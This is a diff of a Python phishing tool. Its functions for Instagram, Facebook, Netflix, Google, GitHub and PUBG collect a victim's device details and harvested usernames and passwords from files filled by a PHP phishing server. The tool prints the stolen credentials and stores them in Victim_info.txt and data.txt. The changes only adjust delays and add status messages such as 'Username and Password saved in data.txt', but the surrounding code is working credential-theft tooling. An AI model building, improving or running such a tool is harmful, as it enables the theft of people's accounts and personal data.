@@ -209,16 +209,20 @@ def instagram():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
-                    sleep(1)
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
+
 
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     break
@@ -226,7 +230,7 @@ def instagram():
     except KeyboardInterrupt:
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
-
+    
 #write username====================================================================================================
     while True:
         size = os.stat("username_key.txt")
@@ -242,7 +246,7 @@ def instagram():
                     data.write(f"\nThe Username is : {x}")
                 sleep(1.5)
                 open("username_key.txt" , "w").close()
-
+                
                 break
 #write password====================================================================================================
 
@@ -250,7 +254,7 @@ def instagram():
         size = os.stat("password_key.txt")
         if size.st_size != 0:
             with open("password_key.txt" , "r") as pas:
-                sleep(10)
+                sleep(15)
                 print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
                 #clear password.txt
@@ -262,6 +266,9 @@ def instagram():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+                
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 
@@ -273,7 +280,6 @@ def instagram():
     else:
         subprocess.call("sudo pkill php" , stdout=subprocess.DEVNULL , shell=True)
         sys.exit()
-
 
 #option 2 ====================================================================================================
 def facebook():
@@ -335,14 +341,20 @@ def facebook():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
+                    sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
+
 
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
@@ -387,6 +399,9 @@ def facebook():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 #kill php proccess and exit====================================================================================================
@@ -459,14 +474,20 @@ def netflix():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
+                    sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
+
 
                     
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
@@ -511,6 +532,9 @@ def netflix():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 #kill php proccess and exit====================================================================================================
@@ -583,14 +607,20 @@ def Google():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
+                    sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
+
                     
                 
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
@@ -636,6 +666,9 @@ def Google():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 #kill php proccess and exit====================================================================================================
@@ -706,16 +739,20 @@ def Github():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
-                    sleep(1)
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
                     open("info.json" , "w").close()
                     victim_file.close()
+
 
                     Sprint(Fore.YELLOW + "\r\nWaiting for target info...".title() + Fore.RESET)
                     
@@ -759,6 +796,9 @@ def Github():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 
@@ -830,11 +870,14 @@ def Pubg():
                     print("\r\nOs Name :" , data["dev"][0]["Os-Name"])
                     print("\r\nBrowser Name :" , data["dev"][0]["Browser-Name"] + Fore.RESET)
                     
-                    sleep(1)
+                    sleep(0.3)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Other info's in Victim_info.txt" + Fore.RESET)
+                    
+                    sleep(0.5)
                     df = pd.read_json(r"info.json")
                     sleep(1)
                     df.to_csv("Victim_info.txt", index=False , mode="a")
-
+                    sleep(1)
                     victim_file= open("Victim_info.txt", "a")
                     victim_file.write("\n")
                     sleep(3)
@@ -885,6 +928,9 @@ def Pubg():
                 data.close()
                 sleep(1.5)
                 open("password_key.txt" , "w").close()
+
+                sleep(0.5)
+                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
                 break
 #kill php proccess and exit====================================================================================================
